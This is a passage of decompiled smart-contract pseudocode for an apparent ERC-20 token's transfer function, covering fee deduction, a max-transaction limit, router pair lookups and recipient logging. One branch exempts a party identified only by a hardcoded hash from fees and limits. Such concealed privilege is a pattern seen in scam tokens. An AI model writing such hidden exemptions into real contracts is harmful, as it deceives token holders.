                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _12233 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12233 + 32 len mem[_12233]]):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if this.address == arg1:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor16[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < 0:
                                                                revert with 0, 17
                                                            if balanceOf[0] > -1:
                                                                revert with 0, 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !arg2:
                                                                revert with 0, 17
                                                            balanceOf[arg1] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 0, 17
                                                            if not arg2:
                                                                revert with 0, 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 0, 17
                                                            if balanceOf[0] > !(arg2 * _fee / 100):
                                                                revert with 0, 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                                revert with 0, 17
                                                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    return 1
}



}
